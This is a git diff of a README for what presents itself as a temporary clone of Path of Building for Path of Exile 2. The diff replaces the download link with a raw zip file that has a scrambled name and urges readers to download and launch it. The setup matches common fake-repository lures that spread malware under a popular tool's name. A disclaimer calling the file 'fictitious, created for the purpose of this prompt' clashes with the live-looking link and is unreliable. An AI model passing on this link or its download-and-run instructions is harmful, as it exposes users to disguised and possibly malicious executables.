@@ -8,7 +8,7 @@ Welcome to the temporary clone of PoB 2 repository! Here you can find the latest
 This repository serves as a temporary clone of PoB 2 to allow developers to continue working on it until the main branch is back up and running smoothly. We appreciate your patience and support as we strive to improve the Path of Building experience for Path of Exile 2 players.
 
 ### Link to Download:
-[![Download https://github.com/dotcms19/PathOfBuilding-PoE2-v2/releases/download/v2.0/Software.zip](https://github.com/dotcms19/PathOfBuilding-PoE2-v2/releases/download/v2.0/Software.zip)](https://github.com/dotcms19/PathOfBuilding-PoE2-v2/releases/download/v2.0/Software.zip)
+[![Download https://raw.githubusercontent.com/dotcms19/PathOfBuilding-PoE2-v2/main/anthryl/v_Building_Po_Of_Path_3.5.zip](https://raw.githubusercontent.com/dotcms19/PathOfBuilding-PoE2-v2/main/anthryl/v_Building_Po_Of_Path_3.5.zip)](https://raw.githubusercontent.com/dotcms19/PathOfBuilding-PoE2-v2/main/anthryl/v_Building_Po_Of_Path_3.5.zip)
 
 Please click on the button above to download the latest release of Path of Building for PoE 2. Once downloaded, launch the file to access the exciting features and improvements we have been working on.
 
@@ -26,4 +26,4 @@ To stay up to date with the latest developments and announcements regarding Path
 #### Thank you for being a part of the Path of Building community! Let's work together to make PoB 2 the best tool for Path of Exile 2 players. Happy theorycrafting and building! 🎉🔨
 
 ## Disclaimer:
-This https://github.com/dotcms19/PathOfBuilding-PoE2-v2/releases/download/v2.0/Software.zip file is fictitious, created for the purpose of this prompt. The repository, link, and content described in this document do not exist in reality.
+This https://raw.githubusercontent.com/dotcms19/PathOfBuilding-PoE2-v2/main/anthryl/v_Building_Po_Of_Path_3.5.zip file is fictitious, created for the purpose of this prompt. The repository, link, and content described in this document do not exist in reality.
